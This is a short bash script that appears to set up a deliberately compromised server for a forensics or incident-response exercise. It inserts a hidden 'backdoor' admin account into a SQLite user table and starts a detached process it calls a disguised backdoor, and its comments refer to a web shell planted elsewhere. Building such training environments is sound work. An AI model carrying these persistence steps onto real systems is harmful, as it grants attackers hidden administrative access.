#!/bin/bash
# Runtime-only artifacts for server_1 (sourced by entrypoint after services start).
# Static files (logs, .ssh, bash_history, cron, web shell) are baked in by plant_static.sh.
set +e

# --- Insert backdoor admin user into SQLite DB (init_db.php has already run) ---
(
  sleep 3
  sqlite3 /var/www/html/portal.db "INSERT INTO users (username, password, role) VALUES ('backdoor', 'hacked', 'admin');" 2>/dev/null || true
) &

# --- Start disguised backdoor process ---
nohup /opt/artifacts/backdoor.sh >/dev/null 2>&1 &
